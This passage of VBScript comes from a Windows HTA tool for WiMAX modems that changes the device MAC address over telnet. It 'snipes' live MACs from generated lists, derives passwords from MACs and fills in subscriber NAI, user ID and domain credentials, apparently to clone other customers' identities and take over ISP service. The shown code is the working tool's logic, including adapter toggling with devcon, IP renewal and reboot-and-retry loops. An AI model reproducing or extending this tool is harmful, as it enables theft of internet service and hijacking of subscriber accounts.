Msgbox "RESTORE method is ENABLED.", 64+4096 , "Restore METHOD is selected."
Else
document.all.chkEnableLabelRestore.style.background = ""
Msgbox "REBOOT method is ENABLED" , 64+4096 , "Reboot METHOD is selected."
End If
End Sub
Sub PasteTextSnipe
InputacAddress.value = Trim(document.parentwindow.clipboardData.GetData("text"))
OnKeyUpInputMacAddress
End Sub	
Sub PasteTextChangeMacOnly
inputChangeMacOne.value = Trim(document.parentwindow.clipboardData.GetData("text"))
GetPassAndDomainPass
End Sub	
Sub PasteTextChangeSerial
inputChangeSerial.value = Trim(document.parentwindow.clipboardData.GetData("text"))
End Sub	
Sub PasteTextMacPassUtility
InputMacToGenPassword.value = Trim(document.parentwindow.clipboardData.GetData("text"))
getMacGeneratedPassword
End Sub	
Sub PasteTextEncodeDecode
inputTextToEncodeDecode.value = Trim(document.parentwindow.clipboardData.GetData("text"))
getEncodeDecodeText inputTextToEncodeDecode.value
End Sub	
Sub GetChkIncDec
If chkIncDec.Checked Then
document.all.chkIncDecLabel.style.background = "Red"
Msgbox "Increment MAC method is enabled." , 64+4096 , "Snipe NAI Settings"
Else
document.all.chkIncDecLabel.style.background = ""
Msgbox "Decrement MAC method is enabled. " , 64+4096 , "Snipe NAI Settings"
End If
'	If chkExcludeNai.Checked = True Then
'		Msgbox "The checkbox is " & chkExcludeNai.value
'	End if
'	If chkExcludeNai.Checked = False Then
'		Msgbox "The checkbox is " & chkExcludeNai.value
'	End If
End Sub
'shutdown'
Sub GetChkShutDownSnipe
If chkShutDownSnipe.Checked Then
document.all.shutdownPCLabel.style.background = "red"
Msgbox "Setting Shutdown PC is ENABLED after scan." , 64+4096 , "Shutdown PC?"
' shutdownPCLabel.style.color = "RED"
'shutdownPCLabel.InnerHTML.style.color = "RED"
Else
document.all.shutdownPCLabel.style.background = ""
Msgbox "Setting Shutdown PC is DISABLED after scan." , 64+4096 , "Shutdown PC?"
End If
'	If chkExcludeNai.Checked = True Then
'		Msgbox "The checkbox is " & chkExcludeNai.value
'	End if
'	If chkExcludeNai.Checked = False Then
'		Msgbox "The checkbox is " & chkExcludeNai.value
'	End If
End Sub
Sub GetChkAdvancePass
If chkAdvancePass.Checked Then
document.all.chkAdvancePassLabel.style.background = "red"
Msgbox "Advance PASS USERID and PASSWORD Security ENABLED." , 64+4096 , "Advance PASS?"
'chkAdvancePass.Checked = False
Else
document.all.chkAdvancePassLabel.style.background = ""
Msgbox "Advance PASS USERID and PASSWORD Security DISABLED." , 64+4096 , "Advance PASS?"
End If
End Sub
''
Sub GetChkAutoCheckUpdate
If chkAutoCheckUpdate.Checked Then
CreateTestTryAndSpeedSettings
document.all.chkAutoCheckUpdateLabel.style.background = "Green"
Msgbox "Automatic CHECK tool update is  ENABLED." , 64+4096 , "Update option...."
Else
CreateTestTryAndSpeedSettings
document.all.chkAutoCheckUpdateLabel.style.background = ""
Msgbox "Automatic CHECK tool update is DISABLED." , 64+4096 , "Update option...."
End If
End Sub
''
Sub GetChkDonotTestAll
If chkDonotTestAll.Checked Then
document.all.chkDonotTestAllLabel.style.background = "red"
Msgbox "Do not TEST all DOMAIN if live mac is found ENABLED." , 64+4096 , "Domain TEST ALL?"
Else
document.all.chkDonotTestAllLabel.style.background = ""
Msgbox "Do not TEST all DOMAIN if live mac is found DISABLED." , 64+4096 , "Domain TEST ALL?"
End If
End Sub
''
Function Is32BitOS()
    Const Path = "winmgmts:root\cimv2:Win32_Processor='cpu0'"
    Is32BitOS = (GetObject(Path).AddressWidth = 32)
End Function

Function Is64BitOS()
    Const Path = "winmgmts:root\cimv2:Win32_Processor='cpu0'"
    Is64BitOS = (GetObject(Path).AddressWidth = 64)
End Function
''
Sub DetectOsArch
DisableSysInfoButton
On Error Resume Next
	''if 32bit
	If Is32BitOS Then
		If IsWindowsXp Then
			deviceOs = "winxp-32"
			set objSelectIdDomainDef = document.getElementById("drpDwnOs")
			for i = 0 to objSelectIdDomainDef.length 
					If objSelectIdDomainDef.options(i).value = deviceOs   Then
						drpDwnOs.selectedIndex = i
					Exit for
				End if
			Next
		Else
			deviceOs = "winVista-7-8-32"
			set objSelectIdDomainDef = document.getElementById("drpDwnOs")
			for i = 0 to objSelectIdDomainDef.length 
					If objSelectIdDomainDef.options(i).value = deviceOs   Then
						drpDwnOs.selectedIndex = i
					Exit for
				End if
			Next
		End If
	''if 64bit
	Else
			If IsWindowsXp Then
			deviceOs = "winxp-64"
			set objSelectIdDomainDef = document.getElementById("drpDwnOs")
			for i = 0 to objSelectIdDomainDef.length 
					If objSelectIdDomainDef.options(i).value = deviceOs   Then
						drpDwnOs.selectedIndex = i
					Exit for
				End if
			Next
		Else
			deviceOs = "winVista-7-8-64"
			set objSelectIdDomainDef = document.getElementById("drpDwnOs")
			for i = 0 to objSelectIdDomainDef.length 
					If objSelectIdDomainDef.options(i).value = deviceOs   Then
						drpDwnOs.selectedIndex = i
					Exit for
				End if
			Next
		End If
	
	End If
EnableSysInfoButton
	MsgBox "Detection finished... Please double check if correct.",64+4096,"Status Message....."
End Sub ''end detectOsArch
''
Sub ClearAdapterListDropDown
    For Each objOption in drpDwnNetAdapter.Options
       objOption.RemoveNode
    Next
End Sub
''
Sub DisableSysInfoButton
btnDetectOs.Disabled = True
RefreshAdapterList.Disabled = True
drpDwnNetAdapter.Disabled = True
btnSaveSysInfo.Disabled = True
btnTestLan.Disabled = True
End Sub
''
Sub EnableSysInfoButton
btnDetectOs.Disabled = False
RefreshAdapterList.Disabled = False
drpDwnNetAdapter.Disabled = False
btnSaveSysInfo.Disabled = False
btnTestLan.Disabled = False
End Sub
''
Sub GetNetworkAdapterList
RefreshAdapterList.value = "Wait!.."
DisableSysInfoButton
On Error Resume Next
''ClearAdpaterList
ClearAdapterListDropDown
Set objOptionEmpty = Document.createElement("OPTION")
objOptionEmpty.Text = "Select Network Adapter"
objOptionEmpty.Value = "emptylist"
drpDwnNetAdapter.Add(objOptionEmpty)
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set colItems = objWMIService.ExecQuery("Select * from Win32_NetworkAdapter")
deviceName ="NotFound"
devicePid = "NotFound"

For Each objItem in colItems
    ''Wscript.Echo "Adapter Type: " & objItem.AdapterType
 
    Select Case objItem.AdapterTypeID
        Case 0 strAdapterType = "Ethernet 802.3" 
        Case 1 strAdapterType = "Token Ring 802.5" 
        Case 2 strAdapterType = "Fiber Distributed Data Interface (FDDI)" 
        Case 3 strAdapterType = "Wide Area Network (WAN)" 
        Case 4 strAdapterType = "LocalTalk" 
        Case 5 strAdapterType = "Ethernet using DIX header format" 
        Case 6 strAdapterType = "ARCNET" 
        Case 7 strAdapterType = "ARCNET (878.2)" 
        Case 8 strAdapterType = "ATM" 
        Case 9 strAdapterType = "Wireless" 
        Case 10 strAdapterType = "Infrared Wireless" 
        Case 11 strAdapterType = "Bpc" 
        Case 12 strAdapterType = "CoWan" 
        Case 13 strAdapterType = "1394"
    End Select
 
'    DisplayLogChangeMAConly "Adapter Type Id: " & strAdapterType
'    DisplayLogChangeMAConly "AutoSense: " & objItem.AutoSense
'    DisplayLogChangeMAConly "Description: " & objItem.Description
'    DisplayLogChangeMAConly "Device ID: " & objItem.DeviceID
'    DisplayLogChangeMAConly "Index: " & objItem.Index
'    DisplayLogChangeMAConly "MAC Address: " & objItem.MACAddress
'    DisplayLogChangeMAConly "Manufacturer: " & objItem.Manufacturer
'    DisplayLogChangeMAConly "Maximum Number Controlled: " & objItem.MaxNumberControlled
'    DisplayLogChangeMAConly "Maximum Speed: " & objItem.MaxSpeed
'    DisplayLogChangeMAConly "Name: " & objItem.Name
'    DisplayLogChangeMAConly "Net Connection ID: " & objItem.NetConnectionID
'   DisplayLogChangeMAConly "Net Connection Status: " & objItem.NetConnectionStatus
'    For Each strNetworkAddress in objItem.NetworkAddresses
'        DisplayLogChangeMAConly "NetworkAddress: " & strNetworkAddress
'    Next
'    DisplayLogChangeMAConly "Permanent Address: " & objItem.PermanentAddress
'checkRootTxt = objItem.PNPDeviceID
'If InStr(checkRootTxt,"ROOT")< 1 Then
If objItem.NetConnectionStatus = 2 Or objItem.NetConnectionStatus <>2 Then
    ''DisplayLogChangeMAConly "Product Name: " & objItem.ProductName
    ''DisplayLogChangeMAConly "PNP Device ID: " & objItem.PNPDeviceID

	''deviceName =objItem.ProductName
	''devicePid = objItem.PNPDeviceIDFo
	MyStringPid = (Trim(objItem.PNPDeviceID))
	MyArrayPid = Split(MyStringPid, "&", -1, 1)
	Sleeper 1000
	MyArrayLengthPid = UBound(MyArrayPid) +1
	''MsgBox MyArrayLength
	''If macDomain = "@globelines.com.ph,TLS" Then
	''If MyArrayLength = 2 Then
	deviceName = objItem.ProductName
	devicePid = MyArrayPid(1)
	''End If
'	If MyArray(1) = "TLS" Then
'	isTTLS = False
'	End If 

    adapterListToSave = deviceName & "|" & devicePid
    ''MsgBox adapterListToSave
   	''appendAdapterToFile deviceName,devicePid
   	If MyArrayLengthPid > 1 Then
   	Set objOption = Document.createElement("OPTION")
          objOption.Text = deviceName
          objOption.Value = devicePid
          drpDwnNetAdapter.Add(objOption)
    End If
    
End If 
'    DisplayLogChangeMAConly "Service Name: " & objItem.ServiceName
'    DisplayLogChangeMAConly "Speed: " & objItem.Speed
Next
''appendAdapterToFile(adapterListToSave)
 ''PopulateAdapterList
 RefreshAdapterList.value = "Refresh"
EnableSysInfoButton
MsgBox "FINISHED: Loading available Network Adapter(LAN/WLAN) LIST.." & vbCr & vbLf & vbCr & vbLf & "Please SELECT again your NETWORK ADAPTER." & vbCr & vbLf & vbCr & vbLf & "NOTE: DO NOT forget to TEST and SAVE settings if SUCCESS.",64+4096,"Status Message....."

End Sub
''
Sub PopulateMySystem

'Set objOptionEmpty = Document.createElement("OPTION")
'objOptionEmpty.Text = "Select Network Adapter"
'objOptionEmpty.Value = "emptylist"
'drpDwnNetAdapter.Add(objOptionEmpty)
'strComputer = "."
ClearAdapterListDropDown

filename = "MySystem.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= True Then
Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile(accountFile,1)
strFileText = objFileToRead.ReadLine()
objFileToRead.Close
Set objFileToRead = Nothing
MyString = (Trim(strFileText))
MyArray = Split(MyString, "|", -1, 1)
deviceOs = MyArray(0) 
deviceLanName = MyArray(1)
devicePid = MyArray(2)

set objSelectIdDomainDef = document.getElementById("drpDwnOs")
for i = 0 to objSelectIdDomainDef.length ''for i = 0 to objSelect.length - 2
'msgbox objSelect.options(i).value
If objSelectIdDomainDef.options(i).value = deviceOs   Then
drpDwnOs.selectedIndex = i
Exit for
End if
Next

Set objOption = Document.createElement("OPTION")
          objOption.Text = deviceLanName
          objOption.Value = devicePid
          drpDwnNetAdapter.Add(objOption)
End If
    End Sub
''
''
Sub DisableEnableLANSixToToM
filename = "devcon32.exe"
netAdaptervalue = drpDwnNetAdapter.value
If drpDwnOs.value = "winxp-32" Or drpDwnOs.value = "winVista-7-8-32" Then
filename = "devcon32.exe"
Else
filename = "devcon64.exe"
End if
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)	
tsCmndDisabled = "disable" &" *" &netAdaptervalue &"*"
tsCmndEnabled = "enable" &" *" &netAdaptervalue &"*"
''MsgBox currentFolderAndFile
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &tsCmndDisabled,0 , True
Sleeper 2000
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &tsCmndEnabled,0 , True
Sleeper 2000
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /release", 0, 1
Sleeper 3000
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /renew", 0, 1
End Sub
''
Sub TestDisableEnableLan
filename = "devcon32.exe"
On Error Resume Next
If drpDwnNetAdapter.value = "emptylist" Then
MsgBox "ERROR: You did not select your Network Adapter (LAN/WAN).!!(REQUIRED!!!)",16+4096,"ERROR: SELECT your CORRECT LAN/WLAN....."
Exit Sub
ElseIf drpDwnNetAdapter.value = "" Then
MsgBox "ERROR: You did not select your Network Adapter (LAN/WAN).!!(REQUIRED!!!)" & vbCr & vbLf & vbCr & vbLf & "CLICK Refresh button in Adapter(LAN) to show list of available LAN/WLAN." ,16+4096,"ERROR: SELECT your CORRECT LAN/WLAN....."
Exit Sub
End If
If drpDwnTestLanOption.value = "bothtest" Then
DisableSysInfoButton
btnTestLan.value = "Please Wait!..."
DisableEnableLANSixToToM
btnTestLan.value = "Test W/LAN Only"
EnableSysInfoButton
MsgBox "NOTE: If the TEST ENABLE/DISABLE W/LAN is not working please notify the author. Thank you!",64+4096,"Notification Message....."
Exit Sub
End If
''MsgBox drpDwnTestLanOption.value &" " &drpDwnNetAdapter.value 
''Exit Sub
DisableSysInfoButton
btnTestLan.value = "Please Wait!..."
If drpDwnOs.value = "winxp-32" Or drpDwnOs.value = "winVista-7-8-32" Then
filename = "devcon32.exe"
Else
filename = "devcon64.exe"
End if
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)	
tsCmndLan = drpDwnTestLanOption.value &" *" &drpDwnNetAdapter.value &"*" ''"disable PCI\VEN_10EC"
''MsgBox tsCmndLan
''tsCmndEnabled = "enable PCI\VEN_10EC"
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &tsCmndLan,0 , True
''CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &tsCmndEnabled,0 , True
btnTestLan.value = "Test W/LAN Only"
EnableSysInfoButton
MsgBox "NOTE: If the TEST ENABLE/DISABLE W/LAN is not working please notify the author. Thank you!",64+4096,"Notification Message....."
End Sub
''
''
Sub ChangeMacTest
''
If macIsFull(Trim(inputChangeMacOne.value)) = False Then
 	MsgBox "ERROR: MAC is INVALID. Please CHECK MAC FIELD." & vbCr & vbLf & vbCr & vbLf & "NOTE: You encounter this due to fast keyboard typing on MAC FIELD." ,16+4096,"Error Message....."
	Exit Sub
End If 
If radiobtnBm622m2012.checked Then
	If drpDwnNetAdapter.value = "emptylist" Then
		MsgBox "ERROR: Please SELECT your CORRECT W/LAN Network Adapter first!" & vbCr & vbLf & vbCr & vbLf & "TAB MENU: Tool Settings >> About" ,16+4096,"Error Message....."
		Exit Sub
	ElseIf drpDwnNetAdapter.value = "" Then
		MsgBox "ERROR: Please SETUP first your CORRECT SYSTEM INFO for 622m 2012.(REQUIRED!!!)" & vbCr & vbLf & vbCr & vbLf & "TAB MENU: Tool Settings >> About" ,16+4096,"Error Message....."
		Exit Sub
	End If
End If
''
authUserNameChangeMAC = ""
authUserPassChangeMAC = ""
naiUserNameChangeMAC = ""
currentMacChangeOnly = Trim(inputChangeMacOne.value)
If radiobtnDv235tS.checked Then
authUserNameChangeMAC = inputDomainPassword.value
authUserPassChangeMAC = inputDomainPassword.value
naiUserNameChangeMAC = inputNai.value & drpDwnNaiDomain.value
Else
authUserNameChangeMAC = inputDomainPassword.value & drpDwnNaiDomain.value
authUserPassChangeMAC = inputDomainPassword.value
naiUserNameChangeMAC = inputNai.value & drpDwnNaiDomain.value
End If
''
chkShutDownSnipe.Checked = False
document.all.shutdownPCLabel.style.background = ""

Dim objShellInGen, ansBtn
If ChangingMacButtonOption = "REBOOT" Then
Set objShellInGen = CreateObject("WScript.Shell")
''ansBtn = objShellInGen.Popup("WARNING : Before you continue."& vbCr & vbLf & vbCr & vbLf & "ARE YOU SURE YOU WANT TO CHANGE MAC? "& vbCr & vbLf & vbCr & vbLf & "NOTE: You can modify the following:" & vbCr & vbLf &  " - NAI, USERID, PASSWORD, DOMAIN"& vbCr & vbLf  & vbCr & vbLf &"[OK] = CONTINUE NOW! " & vbCr & vbLf & "[Cancel] = ABORT!", 0, "Change MAC Notification...", 1 + 4096 + 48)
ansBtn = objShellInGen.Popup("Change DEVICE MAC : Are you sure?"& vbCr & vbLf & vbCr & vbLf  &"IMPORTANT: Settings to apply (Please check). " & vbCr & vbLf & vbCr & vbLf &"DEVICE MAC::  " & currentMacChangeOnly & vbCr & vbLf & "NAI::  " & naiUserNameChangeMAC & vbCr & vbLf & "Password::  " & authUserPassChangeMAC & vbCr & vbLf & "User ID::  " & authUserNameChangeMAC & vbCr & vbLf  & vbCr & vbLf &"NOT SURE?,  Please CLICK ABORT button!"  & vbCr & vbLf & "NOTE: You can modify following:" & vbCr & vbLf &  " - NAI, USERID, PASSWORD, DOMAIN"& vbCr & vbLf & vbCr & vbLf & "[OK] = CONTINUE NOW! " & vbCr & vbLf & "[Cancel] = ABORT!", 0, "Confirmation message...", 1 + 4096 + 48)
If (ansBtn = -1 OR ansBtn = 1)  Then
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Change DEVICE MAC: Operation started..."
TextAreaScrollBottom(changeMACLog.name)
ChangeMacTestOnly
Else 
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Change DEVICE MAC: Operation cancelled..."
TextAreaScrollBottom(changeMACLog.name)
Exit Sub
End If
Set objShellInGen = Nothing
Set ansBtn = Nothing
Else
ChangeMacTestOnly
End If
''
End Sub
Sub ChangeMacTestOnly
KillInternetExplorer
pressOk
If changeMacOneOnly.Disabled = True Then
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "MAC is invalid..."
TextAreaScrollBottom(changeMACLog.name)
Exit Sub
End If

hdnStopMacProcess.value = "0"  'set stop process to 0 to continue
hdnStopProcessResult.value = "0"
ClearTstCmndInOut

changeMACLog.value =  "START changing MAC to " & inputChangeMacOne.value & " on " & inputTelnetHost.value
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Checking  " & inputTelnetHost.value & " Please WAIT...."
TextAreaScrollBottom(changeMACLog.name)
'MsgBox "Result is: " &Ping(inputTelnetHost.value)
''If Ping(Trim(inputTelnetHost.value)) Then
If PingHostLoop Then
''display the method  reboot or restore then exit
'	If ChangingMacButtonOption = "REBOOT"  Or ChangingMacButtonOption = "RESTORE" Then
'		changeMACLog.value = changeMACLog.value & vbCr & vbLf & "value method: " & ChangingMacButtonOption
'		TextAreaScrollBottom(changeMACLog.name)
'		Exit Sub
'	End if
''
'StartDate = Now
''

ConnectToTST 'connect to TST access telnet
''
Sleeper 1000
'secElapseTime= DateDiff("s", StartDate, Now)
''
'If secElapseTime > 60 Then
'FinalElapseTimeMin = Round((secElapseTime /60),2)'DateDiff("m", StartDate, Now)
'DisplayLogChangeMAConly( " Elapse Time: " & FinalElapseTimeMin &" min(s)")
'Else
'FinalElapseTimeSec = secElapseTime
'DisplayLogChangeMAConly( " Elapse Time: " & FinalElapseTimeSec &" sec(s)")
'End If
''
'MsgBox "checking log file",16+4096,"Notification"
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Checking telnet log..."
TextAreaScrollBottom(changeMACLog.name)
tstLogCmnd =  "TelnetOutPutCmnd.txt"
Sleeper 1000
If CheckTstLogFile (tstLogCmnd) = True Then	
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Log ok..."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Device is Rebooting..."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Waiting for the device...."
TextAreaScrollBottom(changeMACLog.name)
If radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
DisplayLogChangeMAConly("DV235t is Rebooting: Waiting for approx. 80 seconds......")
Sleeper 85000 ''35000
Else
Sleeper 20000 ''35000
End If
liveCountHost = 0
telnetHostLive = False
Do 
Sleeper 3000
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Waiting for the device is finish...."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Trying to connect after reboot..."
TextAreaScrollBottom(changeMACLog.name)
telnetHostLive = Ping(Trim(inputTelnetHost.value))
'telnetHostLive = Ping("192.168.2.1")
If	telnetHostLive = False Then
liveCountHost = liveCountHost + 1
DisplayLogChangeMAConly "Check try (" &liveCountHost & " of 15)."
Else
Exit Do
End If
If liveCountHost =2 Or liveCountHost =8 Or liveCountHost =13 Then
'MsgBox "Error on interface connecting not Updating"
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Retrying to connect..."
TextAreaScrollBottom(changeMACLog.name)
'CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /release", 0, 1
'Sleeper 5000
'CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /renew", 0, 1
''
If radiobtnBm622m2012.checked Then
DisableEnableLANSixToToM
Sleeper 5000
Else
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /release", 0, 1
Sleeper 5000
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /renew", 0, 1
End If
''
End If
If	liveCountHost >=15  Then
''telnetHostLive = True 
telnetHostLive =  False
Exit Do
'MsgBox telnetHostLive
End If
Loop While telnetHostLive = False
''If liveCountHost >=16 Then
If telnetHostLive = False Then
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Connection Failed...."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Process aborted...."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "WIMAX Device is NOT yet connected..."
TextAreaScrollBottom(changeMACLog.name)
MsgBox "WIMAX Device is NOT yet connected... process aborted.",16,"Connection Status"
'WScript.Quit
hdnStopProcessResult.value = "1"
Exit Sub
Else
liveCountHost = 0
'MsgBox "Connected"
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Connection success!!! Ok...."
TextAreaScrollBottom(changeMACLog.name)
Sleeper 1000
If ChangingMacButtonOption = "REBOOT" Then
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Changing Security Settings...."
TextAreaScrollBottom(changeMACLog.name)
Sleeper 1000
If radiobtnBm622m2012.checked Then
ChangeSecurityOnlyBmSixToToM
''
''dv235t BEGIN
ElseIf radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
''BEGIN check internet
If CheckInternetChangeMAC Then
Sleeper 1000
DisplayLogChangeMAConly("Success: Connected To Internet!!!")
Else
DisplayLogChangeMAConly("Failed: Not Connected To Internet!!!")
End If
''END check internet
''dv235t END
Else
ChangeSecurityOnly
End If
''BEGIN CHANGE FINAL MAC 622i 2011
If radiobtnBm622i2011.checked Then
Sleeper 1000
ClearTstCmndInOut
''If Ping(Trim(inputTelnetHost.value)) Then
DisplayLogChangeMAConly "Checking  " & inputTelnetHost.value & " Please WAIT...."
If PingHostLoop Then

ConnectToTST622i2011FinalMac
Sleeper 1000
''BEGIN CHECK host connection
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Checking telnet log..."
TextAreaScrollBottom(changeMACLog.name)
tstLogCmnd =  "TelnetOutPutCmnd.txt"
Sleeper 1000
If CheckTstLogFile (tstLogCmnd) = True Then	
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Log ok..."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Device is Rebooting..."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Waiting for the device...."
TextAreaScrollBottom(changeMACLog.name)
Sleeper 20000
liveCountHost = 0
telnetHostLive = False
Do 
Sleeper 3000
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Waiting for the device is finish...."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Trying to connect after reboot..."
TextAreaScrollBottom(changeMACLog.name)
telnetHostLive = Ping(Trim(inputTelnetHost.value))
'telnetHostLive = Ping("192.168.2.1")
If	telnetHostLive = False Then
liveCountHost = liveCountHost + 1
Else
Exit Do
End If
If liveCountHost =2 Or liveCountHost =8 Or liveCountHost =13 Then
'MsgBox "Error on interface connecting not Updating"
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Retrying to connect..."
TextAreaScrollBottom(changeMACLog.name)
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /release", 0, 1
Sleeper 5000
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /renew", 0, 1
End If
If	liveCountHost >=15  Then
''telnetHostLive = True 
telnetHostLive =  False
Exit Do 
'MsgBox telnetHostLive
End If
Loop While telnetHostLive = False
''If liveCountHost >=16 Then
If telnetHostLive = False Then
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Connection Failed...."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Process aborted...."
TextAreaScrollBottom(changeMACLog.name)
MsgBox "WIMAX Device is NOT yet connected... process aborted.",16,"Connection Status"
'WScript.Quit
hdnStopProcessResult.value = "1"
Exit Sub
Else
liveCountHost = 0
'MsgBox "Connected"
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Connection success!!! Ok...."
TextAreaScrollBottom(changeMACLog.name)
Sleeper 1000
''BEGIN check Internet after reboot final change mac
''CheckInternetChangeMAC
If CheckInternetChangeMAC Then
Sleeper 1000
DisplayLogChangeMAConly("Success: Connected To Internet!!!")
Else
DisplayLogChangeMAConly("Failed: Not Connected To Internet!!!")
End If
''END check Internet after reboot final change mac
End If
Else
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Error: on Telnet / changing MAC Address...."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Process aborted.... Please check your CONNECTION / MAC."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Tool Version: " & VersionAboutTool
TextAreaScrollBottom(changeMACLog.name)
createTxtLogError changeMACLog.value
MsgBox "Error: TELNET accesss / Changing MAC address. Please check your CONNECTION / MAC. ",16+4096,"Notification message"
hdnStopProcessResult.value = "1"
Exit sub
End If
''END CHECk host connection
Else
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Connection to HOST LOST!!!.... Please try again."
TextAreaScrollBottom(changeMACLog.name)
End If
Sleeper 2000
End If
''END CHANGE FINAL MAC 622i 2011
Else
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Change MAC process finish!...(RESTORE method)"
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Web ADMIN pass:" & webUiAdminPassword.value
TextAreaScrollBottom(changeMACLog.name)
''begin check internet Diag restore
''CheckInternetChangeMAC
''
If CheckInternetChangeMAC Then
Sleeper 1000
DisplayLogChangeMAConly("Success: Connected To Internet!!!")
Else
DisplayLogChangeMAConly("Failed: Not Connected To Internet!!!")
End If
''
''END check internet Diag restore
hdnStopProcessResult.value = "1"
Exit Sub
End If
End If
Else
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Error: on Telnet / changing MAC Address...."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Process aborted.... Please check your CONNECTION / MAC."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Please Check TelnetOutPutCmnd.txt and TelnetInputCmnd.txt. And REPORT it to the author. THANK YOU!"
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Tool Version: " & VersionAboutTool
TextAreaScrollBottom(changeMACLog.name)
createTxtLogError changeMACLog.value
MsgBox "Error: TELNET accesss / Changing MAC address. Please check your CONNECTION / MAC. ",16+4096,"Notification message"
hdnStopProcessResult.value = "1"
Exit sub
End If
Else
changeMACLog.value = "Process aborted.... Please check your CONNECTION if you're already connected to WIMAX device."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Tool Version: " & VersionAboutTool
TextAreaScrollBottom(changeMACLog.name)
createTxtLogError changeMACLog.value
MsgBox "WIMAX device is unreachable... process aborted. Please check your connection.",16,"Connection Status"
hdnStopProcessResult.value = "1"
Exit Sub
End If
hdnStopProcessResult.value = "1"
If chkShutDownSnipe.Checked Then
ShutdownPC
End If
End Sub
''==end testing
''===START MAC snipe/hunt test=====
Sub ReadMacInTheFileAndTest1 ' test read mac in a file loop
Set fso = CreateObject("Scripting.FileSystemObject")
filename = "MacGenList.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set listMacFile = fso.OpenTextFile(textFilePath)
''loop get MAC line by line
Do while not listMacFile.AtEndOfStream 
macToTest =  listMacFile.ReadLine()
'fso.CreateTextFile(macToTest + ".txt")
DisplayLogMacGenScan("Testing: " & macToTest)
For loopLimitTimez = 0 To 3 Step 1
DisplayLogMacGenScan("Loop:  " & loopLimitTimez)
Sleeper 1000
Next
DisplayLogMacGenScan(macToTest & " test FINISHED...")
Loop
''end loop
listMacFile.Close
End Sub
Sub ChangeMacTestSnipe
If radiobtnBm622m2012.checked Then
	If drpDwnNetAdapter.value = "emptylist" Then
		MsgBox "ERROR: Please SELECT your CORRECT W/LAN Network Adapter first!" & vbCr & vbLf & vbCr & vbLf & "TAB MENU: Tool Settings >> About" ,16+4096,"Error Message....."
		Exit Sub
	ElseIf drpDwnNetAdapter.value = "" Then
		MsgBox "ERROR: Please SETUP first your CORRECT SYSTEM INFO for 622m 2012.(REQUIRED!!!)" & vbCr & vbLf & vbCr & vbLf & "TAB MENU: Tool Settings >> About" ,16+4096,"Error Message....."
		Exit Sub
	End If
End If
KillInternetExplorer
pressOk
macLiveCount.innerhtml = 0
Dim objShellInGen, ansBtn
If SnipeMacRadioOption = "REBOOT" Then
If radiobtnBm622i2011.checked Then
MsgBox "SORRY this option is NOT available for BM622i 2011!!!" & vbCr & vbLf & "(WHY? -- VERY SLOW PROCESS) Use RESTORE METHOD instead...",,"NOT AVAILABLE!!!"
Exit Sub
End if
Set objShellInGen = CreateObject("WScript.Shell")
